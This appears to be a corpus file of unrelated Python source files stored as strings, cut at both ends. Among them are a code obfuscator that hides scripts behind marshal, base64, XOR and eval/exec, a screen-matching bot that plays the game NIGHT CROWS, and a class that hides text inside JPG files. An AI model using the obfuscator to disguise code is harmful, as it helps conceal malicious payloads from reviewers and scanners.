Jtr = verts_core(**args)\n    result = result + dd['trans'].reshape((1, 3))\n    result.J_transformed = Jtr + dd['trans'].reshape((1, 3))\n\n    for k, v in dd.items():\n        setattr(result, k, v)\n\n    return result\n",
    "from datetime import datetime\nfrom amiya.apps_manager.safety_monitor import SafetyMonitor\n\nfrom amiya.utils.helper import *\nfrom amiya.automation_handler.units.sequence import AutomationSequence\n\nclass AutomationPlate:\n    def __init__(self, plate_name: str, sequence_list: list[AutomationSequence]):\n        \n        self.plate_name: str                 = plate_name\n        self.date_created: datetime          = None                          # Default to None (and set at to_json() and parse_json())\n        self.other_data                      = None\n        \n        self.sequence_dict: dict[int, AutomationSequence]   = self.__set_ids(sequence_list)\n    \n    \n    def execute(self, safety_monitor: SafetyMonitor):\n        for sequence in [self.sequence_dict[idx] for idx in sorted(self.sequence_dict)]:\n            sequence.execute(safety_monitor)\n    \n    \n    def to_json(self):\n        return {\n            \"metadata\": {\n                \"plate_name\": self.plate_name,\n                \"date_created\": DatetimeHandler.datetime_to_str(self.date_created),\n                \"other_data\": self.other_data\n            },\n            \"sequences\": [\n                seq.sequence_name for seq in self.sequence_dict.values()\n            ]\n        }\n        \n        \n    \n        \n    def set_date_created_to_current(self):\n        self.date_created = DatetimeHandler.get_datetime()\n        \n        \n    def __set_ids(self, sequence_list: list[AutomationSequence]):\n        return {idx+1: sequence for idx, sequence in enumerate(sequence_list)}\n    \n    ",
    "import os\r\nimport sys\r\nimport platform\r\n\r\n\r\ndef clear():\r\n    os.system(\"cls\" if \"win\" in sys.platform.lower() else \"clear\")\r\n\r\n\r\nfrom random import randint, choice\r\nfrom datetime import date\r\nimport secrets\r\nimport string\r\nimport codecs\r\nimport zlib\r\nimport marshal\r\nimport base64\r\n\r\n# Set maximum recursion depth\r\nsys.setrecursionlimit(5000)\r\n\r\nwatermark = f'''\"\"\"\\n  --  Guardian Protector\\n       {date.today().strftime('%d/%m/%Y')}                                                                                                                                           \\n\"\"\"\\n'''\r\n\r\n\r\ndef string_enc(string):\r\n    f = \"\"\r\n    m = randint(3, 12)\r\n\r\n    for letter in string:\r\n        f += str(ord(letter) * m) + \",\"\r\n    f = f[:-1]\r\n\r\n    return f\"''.join(chr(int(i/{m})) for i in [{f}])\"\r\n\r\n\r\n# Encrypt string using custom algorithm\r\ndef encrypt_string(string):\r\n    encrypted_str = \"\"\r\n    multiplier = randint(3, 12)\r\n\r\n    for letter in string:\r\n        encrypted_str += str(ord(letter) * multiplier) + \",\"\r\n    encrypted_str = encrypted_str[:-1]\r\n\r\n    return f\"''.join(chr(int(i/{multiplier})) for i in [{encrypted_str}])\"\r\n\r\n\r\ndef split_string(input_string):\r\n    DIFENT_STACK = {}\r\n    reconstruction = []\r\n\r\n    for char in input_string:\r\n        if char not in DIFENT_STACK:\r\n            var_name = choice(string.ascii_lowercase) + choice(string.ascii_uppercase)\r\n            while var_name in DIFENT_STACK.values():\r\n                var_name = (\r\n                    choice(string.ascii_lowercase)\r\n                    + choice(string.ascii_uppercase)\r\n                    + choice(string.ascii_lowercase)\r\n                )\r\n            DIFENT_STACK[char] = var_name\r\n        reconstruction.append(DIFENT_STACK[char])\r\n    difen_stak_str = \";\".join([f'{var}=\"{chr(char)}\"' for char, var in DIFENT_STACK.items()])\r\n    reconstruction_string = \"+\".join([var for var in reconstruction])\r\n\r\n    return difen_stak_str, reconstruction_string\r\n\r\n\r\nclear()\r\ninput_file = input(f\"Masukkan nama file input (contoh: input.py): \")\r\noutput_file = input(f\"Masukkan nama file output (contoh: output.py): \")\r\n\r\nwith open(input_file, \"rb\") as file:\r\n    code_to_obfuscate = file.read()\r\nrandxor = \"\".join(\r\n    secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)\r\n)\r\n\r\nmemestrings = [\r\n    randxor,\r\n    \"\".join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)),\r\n    \"\".join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)),\r\n    \"\".join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)),\r\n    \"\".join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)),\r\n    \"\".join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase) for i in range(30)),\r\n]\r\n\r\nfor i in range(len(memestrings)):\r\n    memestrings[i] = string_enc(memestrings[i])\r\n# Definisi variabel ptt\r\nptt = \"4637192805\"\r\n\r\n\r\ndef random_math(_sum):\r\n    try:\r\n        f = randint(-_sum, randint(-_sum, 999))\r\n        f1 = randint(-_sum, randint(-_sum, 999))\r\n        f2 = randint(-_sum, randint(-_sum, 999))\r\n        return f\"{_sum-f-f1+f2}+{f}+{f1}-{f2}\"\r\n    except Exception as e:\r\n        print(e)\r\n        return str(_sum)\r\n\r\n\r\nxor = lambda message, key: \"\".join(\r\n    chr(ord(c) ^ ord(k)) for c, k in zip(message, __import__(\"itertools\").cycle(key))\r\n)\r\n\r\n\r\ndef enc(x, use_xor=True):\r\n    final = \"\"\r\n    if use_xor == True:\r\n        x = xor(x, randxor)\r\n    for letter in x:\r\n        fl = \"{}\".format(ord(letter))\r\n        for character in fl:\r\n            final += ptt[int(character)]\r\n        final += \"\u200b\"\r\n    return final[:-1]\r\n\r\n\r\n# print(enc(\"exec\",False))\r\n\r\n\r\ndef obfuscate(code):\r\n    b = compile(code, \"\", \"exec\")\r\n\r\n    code_bytes = marshal.dumps(b)\r\n    encoded_code = base64.b64encode(code_bytes)\r\n\r\n    difen_stak_str, recon_str = split_string(encoded_code)\r\n    code2 = f\"\"\"__builtins__.eval(\"\".join(chr(i) for i in [101,120,101,99]))(__import__({string_enc(\"marshal\")}).loads(__import__({string_enc(\"base64\")}).b64decode({recon_str})))\"\"\"\r\n\r\n    return (\r\n        watermark\r\n        + r\"_f4_, __vars__={}, [];\"\r\n        + f\"\"\"{difen_stak_str};__vars__.append({string_enc(choice(memestrings))});eval({string_enc('setattr(__builtins__,\"______\",compile)')});_f4_[\"\ua000\"]=\"0\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua001\"]=\"1\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua002\"]=\"2\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua003\"]=\"3\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua004\"]=\"4\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua005\"]=\"5\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua006\"]=\"6\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua007\"]=\"7\";__vars__.append({string_enc(choice(memestrings))});_f4_[\"\ua008\"]=\"8\";_f4_[\"\ua009\"]=\"9\";_f4_[\"\ua00a\"]=\"A\";_f4_[\"\ua00b\"]=\"B\";_f4_[\"\ua00c\"]=\"C\";_f4_[\"\ua00d\"]=\"D\";__vars__.append({string_enc(randxor)});_f4_[\"\ua00e\"]=\"E\";_f4_[\"\ua00f\"]=\"F\";_f4_[\"\ua010\"]=\"G\";_f4_",
    "import cv2\r\nimport numpy as np\r\nimport pyautogui\r\nimport pydirectinput\r\nimport pyscreeze\r\nimport pygetwindow as gw\r\nfrom PIL import Image\r\nimport os\r\nimport time\r\nimport tkinter as tk\r\nfrom tkinter import ttk, filedialog, messagebox\r\nfrom datetime import datetime\r\nimport requests\r\nimport json\r\nimport threading\r\nimport subprocess\r\n\r\nselected_images = {}\r\ncurrent_image_index = 0\r\ndetection_running = False\r\ncountdown_active = False\r\ncheck_mouse_active = False\r\n\r\n# ##################################################################\r\n# sync Config\r\ndef load_config(filename):\r\n    try:\r\n        with open(filename, 'r', encoding='utf-8') as file:\r\n            config = json.load(file)\r\n        return config\r\n    except FileNotFoundError:\r\n        return {}\r\n    \r\ndef save_config(config, filename):\r\n    with open(filename, 'w', encoding='utf-8') as file:\r\n        json.dump(config, file, indent=4)\r\n\r\ndef update_config(key, value):\r\n    config[key] = value\r\n    save_config(config, config_filename)\r\n\r\nconfig_filename = \"config.json\"  # \u0e0a\u0e37\u0e48\u0e2d\u0e44\u0e1f\u0e25\u0e4c Config\r\n\r\nconfig = load_config(config_filename)\r\nif not config:\r\n    config = {\r\n        \"debug\": False,\r\n        \"account_name\": \"You Charactor Name\",\r\n        \"key_you_need_to_press\": 8,\r\n        \"On_line_notify\": True,\r\n        \"line_notify_token\": \"insert Line Token here\",\r\n        \"On_Discord_notify\": True,\r\n        \"Discord_Webhook_url\": \"insert Discord Webhook here\",\r\n        \"Config_log_message\": \"Message you need to notify\",\r\n        \"ReLoop_When_First_Detected\": True,\r\n        \"custom_resolution\": False,\r\n        \"resolution_width\": 1920,\r\n        \"resolution_height\": 1080,\r\n        \"threshold\": 0.8,\r\n        \"calibrate_image_mode\": False,\r\n        \"MODE\" : 1,\r\n        \"check_mouse_position\": True,\r\n        \"mouse_point\": [\r\n            [158, 208],\r\n            [1803, 175],\r\n            [1596, 271],\r\n            [1872, 268],\r\n            [1060, 654]\r\n        ]\r\n    }\r\n    save_config(config, config_filename)\r\n# ##################################################################\r\n\r\ndef load_selected_images(folder_path):\r\n    global selected_images\r\n    image_files = [f for f in os.listdir(folder_path) if f.endswith(('.jpg', '.jpeg', '.png', '.PNG'))]\r\n\r\n    selected_images = {}\r\n    for file_name in image_files:\r\n        image_path = os.path.join(folder_path, file_name)\r\n        img = cv2.imread(image_path, cv2.IMREAD_COLOR)\r\n        selected_images[file_name] = img\r\n\r\n\r\ndef detect_selected_image():\r\n    global selected_images, current_image_index\r\n    focused_windows = gw.getWindowsWithTitle('NIGHT CROWS(1)')\r\n    if not focused_windows:\r\n        return False, None, None\r\n    focused_window = focused_windows[0]\r\n\r\n    window_left = focused_window.left\r\n    window_top = focused_window.top\r\n    window_width = focused_window.width\r\n    window_height = focused_window.height\r\n\r\n    region_width = window_width // 3\r\n    region_height = window_height // 3\r\n    region_left = window_left + window_width - region_width\r\n    region_top = window_top + window_height - region_height\r\n\r\n    screen = cv2.cvtColor(np.array(pyscreeze.screenshot(region=(region_left, region_top, region_width, region_height))), cv2.COLOR_RGB2BGR)\r\n \r\n    current_image_name = list(selected_images.keys())[current_image_index]\r\n    selected_image = selected_images[current_image_name]\r\n    \r\n    screen = cv2.GaussianBlur(screen, (3, 3), 0)\r\n    selected_image = cv2.GaussianBlur(selected_image, (3, 3), 0)\r\n    \r\n    result = cv2.matchTemplate(screen, selected_image, cv2.TM_CCOEFF_NORMED)\r\n    _, max_val, _, max_loc = cv2.minMaxLoc(result)\r\n    \r\n    threshold = config.get('threshold')\r\n    \r\n    if max_val > threshold:\r\n        max_loc_global = (max_loc[0] + region_left, max_loc[1] + region_top)\r\n        return True, current_image_name, max_loc_global\r\n    \r\n    return False, None, None\r\n# ##################################################################\r\n#  Check Mouse Position\r\ndef check_mouse_position():\r\n    timestamp = datetime.now().strftime(\"%H:%M\")\r\n    log_text.tag_config(\"green\", foreground=\"green\")\r\n    log_text.tag_config(\"red\", foreground=\"red\")\r\n    while check_mouse_active.is_set():\r\n        if var.get():\r\n            a = pyautogui.position()\r\n            log_message = f\"[ {timestamp} ] Mouse Position: {a} !\\n\"\r\n            log_text.insert(tk.END, log_message, \"green\")\r\n            log_text.delete(\"0.1\", tk.END)\r\n        else:\r\n            log_text.delete(\"1.0\", tk.END)\r\n\r\ndef on_checkbox_click():\r\n    if detection_running == True:\r\n        messagebox.showerror(\"Error\", \"Can't open when bot is activated\")\r\n    else:\r\n        if var.get():\r\n            check_mouse_active.set()\r\n            threading.Thread(target=check_mouse_position).start()\r\n        else:\r\n            check_mouse_active.clear()\r\n\r\n# ##################################################################\r\n# Line Notify\r\nline_notify_token = config.get(\"line_notify_token\")\r\n\r\ndef _lineNotify(message, image_path=None):\r\n    import requests",
    "# -*- coding: utf-8 -*-\n# Author: Cypherr\n\n\n# Define the start and end bytes for the JPG file format\nSTART_BYTES = ['FF', 'D8', 'FF', 'E0']\nEND_BYTES = ['FF', 'D9']\n\n\nclass JPGHiddenMessager(object):\n    def __init__(self, image: str):\n        self._image = image\n\n    def write(self, message):\n        # Open the image file in append binary mode\n        with open(self._image, \"ab\") as f:\n            # Write the message to the file in UTF-8 encoding\n            f.write(message.encode('utf-8'))\n\n    def read(self):\n        # Open the image file in read binary mode\n        with open(self._image, \"rb\") as f:\n            # Read the entire content of the file\n            content = f.read()\n\n            # Check if the file starts with the expected start bytes\n            assert 0 == content.index(bytes.fromhex(\n                \"\".join(START_BYTES))), \"Error in JPG format.\"\n\n            # Find the offset of the end bytes\n            offset = content.index(bytes.fromhex(\"\".join(END_BYTES)))\n\n            # Move the file pointer to the position after the end bytes\n            f.seek(offset+2)\n\n            # Read and return the remaining content\n            return f.read()\n\n    def format(self):\n        try:\n            # Open the image file in read binary mode\n            with open(self._image, \"rb\") as file:\n                # Read the entire content of the file\n                content = file.read()\n\n                # Find the offset of the end bytes\n                offset = content.index(bytes.fromhex(\"\".join(END_BYTES)))\n\n                # Extract the content up to and including the end bytes\n                updated_content = content[:offset+2]\n\n            # Reopen the image file in write binary mode\n            with open(self._image, \"wb\") as file:\n                # Write the updated content back to the file\n                file.write(updated_content)\n\n            # Return True to indicate successful formatting\n            return True\n        except:\n            # Return False if an exception occurs during formatting\n            return False\n",
    "from .models import StudentData\nfrom .serializer import StudentSerializer\nfrom rest_framework.response import Response\nfrom rest_framework.decorators import api_view\nfrom rest_framework import status\n\n\n# Create your views here.\n@api_view([\"GET\", \"POST\"])\ndef student_list(request):\n    if request.method == \"POST\":\n        serialized_data = StudentSerializer(data=request.data)\n        if serialized_data.is_valid():\n            serialized_data.save()\n            return Response(serialized_data.data, status=status.HTTP_201_CREATED)\n        else:\n            return Response(serialized_data.errors, status=status.HTTP_400_BAD_REQUEST)\n    student_data = StudentData.objects.all()\n    serialized_data = StudentSerializer(student_data, many=True)\n    return Response(serialized_data.data, status=status.HTTP_200_OK)\n\n@api_view(['GET', 'PUT', 'DELETE'])\ndef student_detail(request, id):\n    if request.method == \"PUT\":\n        student_data = StudentData.objects.get(id=id)\n        serialized_data = StudentSerializer(student_data, data=request.data)\n        if serialized_data.is_valid():\n            serialized_data.save()\n            return Response(serialized_data.data, status=status.HTTP_200_OK)\n        else:\n            return Response(serialized_data.errors, status=status.HTTP_400_BAD_REQUEST)\n    if request.method == 'DELETE':\n        student_data = StudentData.objects.get(id=id)\n        student_data.delete()\n        return Response({\"Message\":\"Deleted Successfully\"}, status=status.HTTP_200_OK)\n    student_data = StudentData.objects.get(id=id)\n    serialized_data = StudentSerializer(student_data)\n    return Response(serialized_data.data, status=status.HTTP_200_OK)\n",
    "# orm/_orm_constructors.py\n# Copyright (C) 2005-2024 the SQLAlchemy authors and contributors\n# <see AUTHORS file>\n#\n# This module is part of SQLAlchemy and is released under\n# the MIT License: https://www.opensource.org/licenses/mit-license.php\n\nfrom __future__ import annotations\n\nimport typing\nfrom typing import Any\nfrom typing import Callable\nfrom typing import Collection\nfrom typing import Iterable\nfrom typing import NoReturn\nfrom typing import Optional\nfrom typing import overload\nfrom typing import Type\nfrom typing import TYPE_CHECKING\nfrom typing import Union\n\nfrom . import mapperlib as mapperlib\nfrom ._typing import _O\nfrom .descriptor_props import Composite\nfrom .descriptor_props import Synonym\nfrom .interfaces import _AttributeOptions\nfrom .properties import MappedColumn\nfrom .properties import MappedSQLExpression\nfrom .query import AliasOption\nfrom .relationships import _RelationshipArgumentType\nfrom .relationships import _RelationshipDeclared\nfrom .relationships import _RelationshipSecondaryArgument\nfrom .relationships import RelationshipProperty\nfrom .session import Session\nfrom .util import _ORMJoin\nfrom .util import AliasedClass\nfrom .util import AliasedInsp\nfrom .util import LoaderCriteriaOption\nfrom .. import sql\nfrom .. import util\nfrom ..exc import InvalidRequestError\nfrom ..sql._typing import _no_kw\nfrom ..sql.base import _NoArg\nfrom ..sql.base import SchemaEventTarget\nfrom ..sql.schema import _InsertSentinelColumnDefault\nfrom ..sql.schema import SchemaConst\nfrom ..sql.selectable import FromClause\nfrom ..util.typing import Annotated\nfrom ..util.typing import Literal\n\nif TYPE_CHECKING:\n    from ._typing import _EntityType\n    from ._typing import _ORMColumnExprArgument\n    from .descriptor_props import _CC\n    from .descriptor_props import _CompositeAttrType\n    from .interfaces import PropComparator\n    from .mapper import Mapper\n    from .query import Query\n    from .relationships import _LazyLoadArgumentType\n    from .relationships import _ORMColCollectionArgument\n    from .relationships import _ORMOrderByArgument\n    from .relationships import _RelationshipJoinConditionArgument\n    from .relationships import ORMBackrefArgument\n    from .session import _SessionBind\n    from ..sql._typing import _AutoIncrementType\n    from ..sql._typing import _ColumnExpressionArgument\n    from ..sql._typing import _FromClauseArgument\n    from ..sql._typing import _InfoType\n    from ..sql._typing import _OnClauseArgument\n    from ..sql._typing import _TypeEngineArgument\n    from ..sql.elements import ColumnElement\n    from ..sql.schema import _ServerDefaultArgument\n    from ..sql.schema import FetchedValue\n    from ..sql.selectable import Alias\n    from ..sql.selectable import Subquery\n\n\n_T = typing.TypeVar(\"_T\")\n\n\n@util.deprecated(\n    \"1.4\",\n    \"The :class:`.AliasOption` object is not necessary \"\n    \"for entities to be matched up to a query that is established \"\n    \"via :meth:`.Query.from_statement` and now does nothing.\",\n    enable_warnings=False,  # AliasOption itself warns\n)\ndef contains_alias(alias: Union[Alias, Subquery]) -> AliasOption:\n    r\"\"\"Return a :class:`.MapperOption` that will indicate to the\n    :class:`_query.Query`\n    that the main table has been aliased.\n\n    \"\"\"\n    return AliasOption(alias)\n\n\ndef mapped_column(\n    __name_pos: Optional[\n        Union[str, _TypeEngineArgument[Any], SchemaEventTarget]\n    ] = None,\n    __type_pos: Optional[\n        Union[_TypeEngineArgument[Any], SchemaEventTarget]\n    ] = None,\n    *args: SchemaEventTarget,\n    init: Union[_NoArg, bool] = _NoArg.NO_ARG,\n    repr: Union[_NoArg, bool] = _NoArg.NO_ARG,  # noqa: A002\n    default: Optional[Any] = _NoArg.NO_ARG,\n    default_factory: Union[_NoArg, Callable[[], _T]] = _NoArg.NO_ARG,\n    compare: Union[_NoArg, bool] = _NoArg.NO_ARG,\n    kw_only: Union[_NoArg, bool] = _NoArg.NO_ARG,\n    nullable: Optional[\n        Union[bool, Literal[SchemaConst.NULL_UNSPECIFIED]]\n    ] = SchemaConst.NULL_UNSPECIFIED,\n    primary_key: Optional[bool] = False,\n    deferred: Union[_NoArg, bool] = _NoArg.NO_ARG,\n    deferred_group: Optional[str] = None,\n    deferred_raiseload: Optional[bool] = None,\n    use_existing_column: bool = False,\n    name: Optional[str] = None,\n    type_: Optional[_TypeEngineArgument[Any]] = None,\n    autoincrement: _AutoIncrementType = \"auto\",\n    doc: Optional[str] = None,\n    key: Optional[str] = None,\n    index: Optional[bool] = None,\n    unique: Optional[bool] = None,\n    info: Optional[_InfoType] = None,\n    onupdate: Optional[Any] = None,\n    insert_default: Optional[Any] = _NoArg.NO_ARG,\n    server_default: Optional[_ServerDefaultArgument] = None,\n    server_onupdate: Optional[FetchedValue] = None,\n    active_history: bool = False,\n    quote: Optional[bool] = None,\n    system: bool = False,\n    comment: Optional[str] = None,\n    sort_order: Union[_NoArg, int] = _NoArg.NO_ARG,\n    **kw: Any,\n) -> MappedColumn[Any]:\n    r\"\"\"declare a new ORM-mapped :class:`_schema.Column` construct\n    for use w",
    "# %%\nrun_name = \"new\"\n\nimport torch.utils.tensorboard\nfrom collections import OrderedDict\nfrom natsort import natsorted\nimport pathlib\nimport random\nimport shutil\nfrom itertools import groupby\n\nfrom lightning.pytorch.callbacks.early_stopping import EarlyStopping\nfrom lightning.pytorch.callbacks.model_checkpoint import ModelCheckpoint\nimport random\n\n\nimport lightning.pytorch.utilities.seed as seed\nimport torch\nfrom torchvision.datasets import ImageFolder\nimport lightning.pytorch as pl\nimport lightning.pytorch.loggers\nimport torch.nn as nn\nfrom torch.nn import functional as F\nfrom PIL import Image\n\nimport torch.utils.data as tdata\nimport torchmetrics\nimport torchmetrics.classification\nimport torchvision\nimport pydantic\nfrom torch.utils.data import Subset, ConcatDataset\n\nfrom more_itertools import partition\n\ntorch.set_float32_matmul_precision(\"high\")\n\n\ndataset_name = \"n11939491\"\n\n\ndef const_init(model, fill=0.0):\n    for name, param in model.named_parameters():\n        param.data.fill_(fill)\n\n\ndef shuffled(x):\n    x = list(x)\n    return random.sample(x, len(x))\n\n\nsegments_dir = pathlib.Path(\"./data/segments/\")\ntrain_dir = pathlib.Path(\"./data/train/\")\n\nsave_dir = pathlib.Path(\"./models/\") / run_name\nsave_dir.mkdir(exist_ok=True, parents=True)\n(save_dir / \"best\").mkdir(exist_ok=True, parents=True)\n\n\nclass Tree(pydantic.BaseModel):\n    tree: dict[str, list[str]]\n    start_dir: pathlib.Path\n    end_dir: pathlib.Path\n    save_dir: pathlib.Path\n\n\ntree = Tree(\n    tree={\n        \"petal\": [],\n        \"disk\": [],\n        \"flower_head\": [\"disk\", \"petal\"],\n        \"leaf\": [],\n        \"stem\": [],\n        dataset_name: [\"flower_head\", \"stem\", \"leaf\"],\n    },\n    start_dir=segments_dir,\n    end_dir=train_dir,\n    save_dir=save_dir,\n)\n\nall_cnns = {}\n\n\ndef load_frozen(model, ckpt, _req_grad=False, **kwds):\n    result = model.load_from_checkpoint(ckpt, **kwds).to(\"cuda\")\n    result.eval()\n    for i in result.parameters():\n        i.requires_grad = _req_grad\n    return result\n\n\nclass TreeCNN(pl.LightningModule):\n    cnn_children: dict[str, \"TreeCNN\"]\n    name: str\n\n    class Constants(pydantic.BaseModel):\n        data_dir: pathlib.Path\n        batch_size: int\n        crop_size: int\n        learning_rate: float\n\n    constants: Constants\n\n    class Dataset(pydantic.BaseModel):\n        train: tdata.Dataset | None\n        val: tdata.Dataset | None\n        test: tdata.Dataset | None\n\n        all_test: tdata.Dataset | None\n\n        class Config:\n            arbitrary_types_allowed = True\n\n    dataset: Dataset\n\n    def __init__(\n        self,\n        tree: Tree,\n        name: str,\n        is_root: bool = False,\n        inference: bool = False,\n    ):\n        super().__init__()\n        self.save_hyperparameters()\n\n        best = \"\"\n\n        self.is_root = is_root\n        self.name = name\n\n        self.cnn_children = {\n            children_name: all_cnns.setdefault(\n                children_name,\n                load_frozen(\n                    model=self.__class__,\n                    ckpt=tree.save_dir / best / f\"{children_name}.ckpt\",\n                    tree=tree,\n                    name=children_name,\n                    inference=inference,\n                ),\n            )\n            for children_name in tree.tree[name]\n        }\n\n        is_leaf = not self.cnn_children\n\n        def get_constants(is_leaf: bool, is_root: bool) -> \"TreeCNN.Constants\":\n            return TreeCNN.Constants(\n                learning_rate=1e-2,\n                batch_size=256,\n                data_dir=tree.end_dir if is_root else tree.start_dir,\n                crop_size=256 if is_leaf and not is_root else 512,\n            )\n\n        self.constants = get_constants(is_leaf=is_leaf, is_root=is_root)\n\n        self.accuracy = torchmetrics.Accuracy(task=\"binary\")\n        self.f1 = torchmetrics.classification.BinaryF1Score()\n        self.transform = torchvision.transforms.Compose(\n            [\n                torchvision.transforms.ToTensor(),\n            ]\n        )\n        self.dataset_transform = torchvision.transforms.Compose(\n            [\n                torchvision.transforms.RandomAffine(0, translate=(0.1, 0.1)),\n                torchvision.transforms.CenterCrop(\n                    (self.constants.crop_size, self.constants.crop_size)\n                ),\n                self.transform,\n            ]\n        )\n\n        def get_model(is_leaf):\n            def factory_conv2d(\n                input_channels,\n                output_channels,\n                kernel_size,\n                pool_size=4,\n                batch_norm=True,\n            ):\n                return nn.Sequential(\n                    OrderedDict(\n                        {\n                            \"conv1\": nn.Conv2d(\n                                input_channels, output_channels, kernel_size, bias=False\n                            ),\n                            \"norm\": nn.BatchNorm2d(output_channels)\n                            if batch_norm\n                            else nn.Ident",
    "# This file was auto-generated by Fern from our API Definition.\n\nimport datetime as dt\nimport typing\n\nfrom ..core.datetime_utils import serialize_datetime\nfrom ..core.pydantic_utilities import pydantic_v1\nfrom .destination import Destination\nfrom .source import Source\n\n\nclass SourceDestinationMapping(pydantic_v1.BaseModel):\n    embedding_model: str = pydantic_v1.Field()\n    \"\"\"\n    The embedding model\n    \"\"\"\n\n    source: Source = pydantic_v1.Field()\n    \"\"\"\n    The source\n    \"\"\"\n\n    destination: Destination = pydantic_v1.Field()\n    \"\"\"\n    The destination\n    \"\"\"\n\n    def json(self, **kwargs: typing.Any) -> str:\n        kwargs_with_defaults: typing.Any = {\"by_alias\": True, \"exclude_unset\": True, **kwargs}\n        return super().json(**kwargs_with_defaults)\n\n    def dict(self, **kwargs: typing.Any) -> typing.Dict[str, typing.Any]:\n        kwargs_with_defaults: typing.Any = {\"by_alias\": True, \"exclude_unset\": True, **kwargs}\n        return super().dict(**kwargs_with_defaults)\n\n    class Config:\n        frozen = True\n        smart_union = True\n        extra = pydantic_v1.Extra.allow\n        json_encoders = {dt.datetime: serialize_datetime}\n",
    "from PyQt5.QtWidgets import *\nfrom PyQt5.uic import loadUi\nfrom logger import LogManagement\nfrom os import path\n\nclass Meuapp(QMainWindow):\n    log = LogManagement(__file__)\n    num1 = 0\n    num2 = 0\n    numResult = 0\n    op = None\n\n    def __init__(self):\n        super().__init__()\n        loadUi(self.getLocalPath('calculadoraInterface.ui'), self)\n        self.log.info('Iniciei a interface')\n        \n        \n        self.btn0: QPushButton\n        self.btn1: QPushButton\n        self.btn2: QPushButton\n        self.btn3: QPushButton\n        self.btn4: QPushButton\n        self.btn5: QPushButton\n        self.btn6: QPushButton\n        self.btn7: QPushButton\n        self.btn8: QPushButton\n        self.btn9: QPushButton\n        self.btnMais: QPushButton\n        self.btnMenos: QPushButton\n        self.btnVezes: QPushButton\n        self.btnIgual: QPushButton\n        self.btnDivisao: QPushButton\n        self.btnLimpar: QPushButton\n        self.btnInverter: QPushButton\n        self.btnPorcentagem: QPushButton\n        self.btnVirgula: QPushButton\n        self.resultado: QLabel\n\n        self.btn0.clicked.connect(lambda: self.btnClicado(self.btn0))\n        self.btn1.clicked.connect(lambda: self.btnClicado(self.btn1))\n        self.btn2.clicked.connect(lambda: self.btnClicado(self.btn2))\n        self.btn3.clicked.connect(lambda: self.btnClicado(self.btn3))\n        self.btn4.clicked.connect(lambda: self.btnClicado(self.btn4))\n        self.btn5.clicked.connect(lambda: self.btnClicado(self.btn5))\n        self.btn6.clicked.connect(lambda: self.btnClicado(self.btn6))\n        self.btn7.clicked.connect(lambda: self.btnClicado(self.btn7))\n        self.btn8.clicked.connect(lambda: self.btnClicado(self.btn8))\n        self.btn9.clicked.connect(lambda: self.btnClicado(self.btn9))\n\n        self.btnVirgula.clicked.connect(lambda: self.btnClicado(self.btnVirgula))\n        self.btnLimpar.clicked.connect(self.limparDisplay)\n        self.btnInverter.clicked.connect(self.inverter)\n        self.btnIgual.clicked.connect(self.mostraResultado)\n\n        self.btnMais.clicked.connect(lambda: self.definirOperacao(self.adicao))\n        self.btnMenos.clicked.connect(lambda: self.definirOperacao(self.subtracao))\n        self.btnVezes.clicked.connect(lambda: self.definirOperacao(self.multiplicacao))\n        self.btnDivisao.clicked.connect(lambda: self.definirOperacao(self.divisao))\n        self.btnPorcentagem.clicked.connect(self.porcentagem)     \n    \n    def mostrarDisplay(self, value):\n        value = str(value).replace('.', ',')\n        self.resultado.setText( value )\n\n    def pegarDisplay(self):\n        value = self.resultado.text()\n        value = value.replace(',', '.')\n        try:value = int(value)\n        except:value = float(value)\n        return value\n\n    def btnClicado(self, btn):\n        ultimoValor = str( self.pegarDisplay() )\n        #Digitando virgula\n        if btn.text() == ',':\n            if isinstance(self.pegarDisplay(), float):\n                return\n        #Digitando numeros\n        else:\n            # Se for numero inteiros\n            if isinstance(self.pegarDisplay(), int):\n                if self.pegarDisplay() == 0:\n                    ultimoValor = ''\n            # Se for numero float\n            else:\n                if self.resultado.text()[-1] == \",\":\n                    ultimoValor = self.resultado.text()\n        self.mostrarDisplay(ultimoValor + btn.text())\n\n    def inverter(self):\n        numAtual = self.pegarDisplay()\n        numAtual *= -1\n        self.mostrarDisplay(numAtual)\n\n    def definirOperacao(self, operacao):\n        self.op = operacao\n        self.num1 = self.pegarDisplay()\n        self.num2 = 0\n        self.mostrarDisplay(0)\n\n    def resultadoFinal(self):\n        if self.op:\n            self.num2 = self.pegarDisplay()\n            return self.op()\n        else:\n            print('nao tem operacao feita')\n\n    def adicao(self):\n        print(f'Soma({self.num1}+{self.num2}) = ', end='')\n        return self.num1 + self.num2\n\n    def subtracao(self):\n        print(f'Sub({self.num1} - {self.num2})= ', end='')\n        return self.num1 - self.num2\n    \n    def multiplicacao(self):\n        print(f'Mult({self.num1} * {self.num2})= ', end='')\n        return self.num1 * self.num2\n    \n    def divisao(self):\n        print(f'Div({self.num1} / {self.num2})= ', end='')\n        return self.num1 / self.num2\n    \n    def porcentagem(self):\n        percento = self.pegarDisplay() / 100\n        if self.op == self.adicao or self.op == self.subtracao:\n            percento = self.num1 * percento\n        self.mostrarDisplay(percento)\n\n    def mostraResultado(self):\n        if self.op:\n            if self.num2:\n                self.num1 = self.pegarDisplay()\n            else:\n                self.num2 = self.pegarDisplay()\n \n            self.numResult = self.op()\n            self.mostrarDisplay(self.numResult)\n            print(self.numResult)\n\n    def limparDisplay(self):\n        self.num1 = 0\n        self.num2 = 0\n        sel",
